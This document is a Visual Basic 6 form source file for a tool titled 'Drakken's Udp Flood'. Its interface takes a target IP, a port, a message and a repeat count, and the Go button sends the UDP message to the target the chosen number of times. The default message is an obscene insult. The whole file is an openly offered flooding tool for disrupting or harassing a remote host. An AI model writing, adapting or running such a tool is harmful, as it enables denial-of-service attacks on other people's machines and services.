VERSION 5.00
Object = "{6B7E6392-850A-101B-AFC0-4210102A8DA7}#1.2#0"; "COMCTL32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H80000007&
   Caption         =   "Drakken's Udp Flood "
   ClientHeight    =   3900
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   6375
   LinkTopic       =   "Form1"
   Picture         =   "udp.frx":0000
   ScaleHeight     =   3900
   ScaleWidth      =   6375
   StartUpPosition =   3  'Windows Default
   Begin VB.PictureBox Picture1 
      Height          =   3015
      Left            =   3600
      Picture         =   "udp.frx":37052
      ScaleHeight     =   2955
      ScaleWidth      =   2355
      TabIndex        =   11
      Top             =   -600
      Width           =   2415
   End
   Begin VB.PictureBox UDP1 
      Height          =   480
      Left            =   3720
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   10
      Top             =   0
      Width           =   1200
   End
   Begin ComctlLib.ProgressBar ProgressBar1 
      Height          =   255
      Left            =   0
      TabIndex        =   9
      Top             =   2400
      Width           =   4575
      _ExtentX        =   8070
      _ExtentY        =   450
      _Version        =   327682
      Appearance      =   1
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Go"
      Height          =   255
      Left            =   4560
      TabIndex        =   8
      Top             =   2400
      Width           =   1095
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Text            =   "127.0.0.1"
      Top             =   240
      Width           =   3375
   End
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   120
      TabIndex        =   3
      Text            =   "10000"
      Top             =   2040
      Width           =   3375
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   120
      TabIndex        =   2
      Text            =   "Fuck You Cunt! Hahahahah"
      Top             =   1440
      Width           =   3375
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   120
      TabIndex        =   1
      Text            =   "8"
      Top             =   840
      Width           =   3375
   End
   Begin VB.Frame Frame1 
      Caption         =   "IP"
      Height          =   615
      Left            =   0
      TabIndex        =   4
      Top             =   0
      Width           =   3615
   End
   Begin VB.Frame Frame2 
      Caption         =   "Port"
      Height          =   615
      Left            =   0
      TabIndex        =   5
      Top             =   600
      Width           =   3615
   End
   Begin VB.Frame Frame3 
      Caption         =   "Message To Flood"
      Height          =   615
      Left            =   0
      TabIndex        =   6
      Top             =   1200
      Width           =   3615
   End
   Begin VB.Frame Frame4 
      Caption         =   "Repeats"
      Height          =   615
      Left            =   0
      TabIndex        =   7
      Top             =   1800
      Width           =   3615
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
On Error Resume Next
UDP1.LocalPort = 666
UDP1.RemotePort = Text2.Text
UDP1.RemoteHost = Text1.Text
ProgressBar1.Max = Text4.Text
For i = 1 To Text4.Text
UDP1.SendData Text3.Text
ProgressBar1.Value = i
Next i
End Sub

Private Sub UDP_Error(Number As Integer, Description As String, Scode As Long, Source As String, HelpFile As String, HelpContext As Long, CancelDisplay As Boolean)

End Sub

Private Sub Image1_Click()

End Sub

